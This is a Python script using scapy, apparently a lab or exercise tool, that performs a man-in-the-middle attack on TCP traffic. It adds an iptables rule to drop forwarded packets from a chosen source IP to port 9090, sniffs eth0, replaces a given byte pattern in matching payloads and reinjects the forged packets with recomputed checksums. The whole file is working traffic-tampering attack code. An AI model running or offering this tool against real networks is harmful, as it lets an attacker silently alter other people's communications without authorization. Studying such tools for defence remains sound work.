#!/usr/bin/env python3
import argparse
from scapy.all import *

# --- Parse Command Line Arguments ---
parser = argparse.ArgumentParser(description="MITM Packet Modifier")
parser.add_argument("-s", "--src", required=True, help="Source IP address to filter")
parser.add_argument("-f", "--find", required=True, help="Pattern to find in payload")
parser.add_argument("-r", "--replace", required=True, help="Pattern to replace it with")
args = parser.parse_args()

import subprocess

# Your drop rule
iptables_cmd = [
    "iptables",
    "-A", "FORWARD",
    "-s", args.src,
    "-p", "tcp",
    "--dport", "9090",
    #"-m", "string",
    #"--string", args.find,
    #"--algo", "kmp",
    "-j", "DROP"
]

try:
    subprocess.run(iptables_cmd, check=True)
    print(f"[+] iptables rule added to drop original packets containing: {args.find}")
except subprocess.CalledProcessError as e:
    print(f"[!] Failed to add iptables rule: {e}")


# --- Convert inputs to bytes ---
FIND = args.find.encode()
REPLACE = args.replace.encode()
SRC_IP = args.src

# --- Enforce same length or pad if shorter ---
if len(REPLACE) != len(FIND):
    if len(REPLACE) < len(FIND):
        REPLACE = REPLACE.ljust(len(FIND), b' ')  # pad with spaces
        print(f"[!] REPLACE padded: {REPLACE}")
    else:
#        FIND = FIND.ljust(len(REPLACE), b' ')
#	print(f"[!] FIND is padded: {FIND}")
        print("[!] ERROR: --replace is longer than --find, TCP stream would break.")
        exit(1)

print("\n[*] MITM Packet Modifier Running...")
print(f"    Filtering from: {SRC_IP}")
print(f"    Replacing: {FIND} -> {REPLACE}\n")

# --- Packet Interception ---
def spoof_pkt(pkt):
    print(pkt.haslayer(TCP))
    if pkt.haslayer(IP) and pkt.haslayer(TCP) and pkt[IP].src == SRC_IP:
        if pkt[TCP].payload:
            data = pkt[TCP].payload.load
            print(f"[>] Raw data: {repr(data)}")

            if FIND in data:
                print(f"[+] Match found. Replacing data...")

                newdata = data.replace(FIND, REPLACE)

                newpkt = IP(bytes(pkt[IP]))
                del(newpkt.chksum)
                del(newpkt[TCP].payload)
                del(newpkt[TCP].chksum)

                send(newpkt / newdata)
                print(f"[+] Modified and sent new packet. {newdata} \n")
            else:
                print("[-] No target string found.\n")
        else:
            print("[-] TCP packet has no payload.\n")
    else:
        pass  # Not IP/UDP or wrong source IP

# --- Sniff packets ---
sniff(iface="eth0", filter="tcp", prn=spoof_pkt)
